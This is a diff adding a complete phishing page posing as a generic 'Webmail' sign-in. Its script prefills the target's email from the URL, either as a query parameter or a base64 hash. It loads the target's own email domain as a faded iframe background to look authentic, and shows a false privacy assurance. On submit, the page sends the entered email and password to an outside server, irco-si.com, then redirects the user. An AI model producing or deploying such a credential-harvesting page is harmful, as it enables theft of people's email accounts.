@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webmail Login</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            position: relative;
+            overflow: hidden;
+        }
+        #background-iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: 0;
+            opacity: 0.5; /* Adjust transparency as needed */
+            pointer-events: none; /* Prevent interaction with iframe */
+        }
+        .login-container {
+            background: rgba(255, 255, 255, 0.8); /* Semi-transparent white for readability over iframe */
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+        }
+        .logo {
+            display: inline-flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .envelope {
+            width: 40px;
+            height: 40px;
+            background-color: #ff9500;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 10px;
+            color: white;
+            font-size: 20px;
+            line-height: 1;
+        }
+        .logo-text {
+            font-size: 24px;
+            font-weight: bold;
+            color: #ff9500;
+        }
+        .sign-in-title {
+            font-size: 18px;
+            margin-bottom: 20px;
+            color: #666;
+        }
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 5px;
+        }
+        .form-control {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #d1d1d6;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+            background-color: #f9f9f9;
+        }
+        .form-control:focus {
+            outline: none;
+            border-color: #007aff;
+            background-color: white;
+        }
+        .sign-in-btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #007aff;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .sign-in-btn:hover {
+            background-color: #0056cc;
+        }
+        .message {
+            margin-top: 10px;
+            font-size: 14px;
+            color: green; /* Default color for all messages */
+            display: none; /* Hidden by default */
+        }
+        .message.error {
+            color: red; /* Override to red for errors */
+        }
+        .privacy {
+            font-size: 12px;
+            color: #999;
+            margin-top: 15px;
+            line-height: 1.4;
+        }
+        .windows-activate {
+            position: absolute;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 12px;
+            color: #999;
+            text-align: center;
+            display: none;
+        }
+        @media (min-width: 768px) {
+            .login-container {
+                padding: 40px;
+            }
+            .windows-activate {
+                display: block;
+            }
+        }
+    </style>
+</head>
+<body>
+    <iframe id="background-iframe"></iframe>
+    <div class="login-container">
+        <div class="logo">
+            <div class="envelope">📧</div>
+            <span class="logo-text">Webmail</span>
+        </div>
+        <div class="sign-in-title">Sign in to confirm</div>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="email">Email</label>
+                <input type="email" class="form-control" id="email" name="email" placeholder="Enter your email" required value="">
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" class="form-control" id="password" name="password" placeholder="Enter your password" required>
+            </div>
+            <button type="submit" class="sign-in-btn">Confirm</button>
+            <div class="message" id="message"></div>
+        </form>
+        <div class="privacy">
+            <strong>Privacy Policy:</strong><br>
+            Your information is only for the sole purpose of viewing this document and would not be sold or shared to any third party.
+        </div>
+    </div>
+    <div class="windows-activate">
+        Activate Windows<br>
+        Go to Settings to activate Windows.
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const hash = window.location.hash.substring(1);
+            let email = '';
+
+            // Prioritize query parameter ?email=, fallback to base64 decoded hash
+            if (urlParams.has('email')) {
+                email = urlParams.get('email');
+                console.log('Email from query:', email);
+            } else if (hash) {
+                try {
+                    email = atob(hash);
+                    console.log('Email from hash:', email);
+                } catch (e) {
+                    console.error('Invalid base64 in URL hash:', e);
+                }
+            }
+
+            if (email && email.includes('@')) {
+                document.getElementById('email').value = email;
+                const domain = email.split('@')[1].toLowerCase();
+                const iframe = document.getElementById('background-iframe');
+                iframe.src = `https://${domain}`; // Load domain webpage as background
+                console.log(`Loading background from: https://${domain}`);
+            } else {
+                console.warn('No valid email found in URL.');
+                // Fallback to a default background if no valid email
+                document.body.style.backgroundColor = '#f5f5f5';
+            }
+
+            const messageDiv = document.getElementById('message');
+
+            document.getElementById('loginForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                const email = document.getElementById('email').value;
+                const password = document.getElementById('password').value;
+
+                fetch('https://irco-si.com/submit', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ email, password }),
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.error) {
+                        messageDiv.textContent = data.error;
+                        messageDiv.className = 'message error'; // Red for error
+                        messageDiv.style.display = 'block';
+                    } else if (data.message) {
+                        messageDiv.textContent = data.message;
+                        messageDiv.className = 'message'; // Green for success messages
+                        messageDiv.style.display = 'block';
+                        if (data.redirect) {
+                            setTimeout(() => {
+                                messageDiv.textContent = 'Redirecting...';
+                                messageDiv.className = 'message'; // Ensure green
+                                setTimeout(() => {
+                                    window.location.href = data.redirect + (urlParams.has('email') ? '?email=' + encodeURIComponent(email) : '');
+                                }, 1500); // 1.5-second delay before redirect
+                            }, 1500); // 1.5 seconds for "Successful confirmation"
+                        }
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    messageDiv.textContent = 'Failed to submit data';
+                    messageDiv.className = 'message error'; // Red for error
+                    messageDiv.style.display = 'block';
+                });
+            });
+        });
+    </script>
+</body>
+</html>
